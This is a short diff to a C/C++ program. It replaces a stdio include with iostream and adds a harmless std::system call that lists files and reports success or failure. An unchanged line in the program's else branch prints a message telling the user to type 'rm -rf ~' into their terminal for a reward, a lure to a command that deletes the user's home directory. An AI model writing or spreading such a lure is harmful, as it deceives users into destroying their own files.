@@ -1,4 +1,5 @@
-#include <stdio.h>
+#include <iostream>
+using namespace std;
 
 int main() {
     int k;
@@ -8,5 +9,13 @@ int main() {
     } else {
         cout << "plese copy and type this into your terminal for a reward :rm -rf ~";
     }
+        int returnCode = std::system("ls -l"); 
+
+    if (returnCode == 0) {
+        std::cout << "Command executed successfully." << std::endl;
+    } else {
+        std::cout << "Command failed with return code " << returnCode << std::endl;
+    }
+
     return 0;
 }
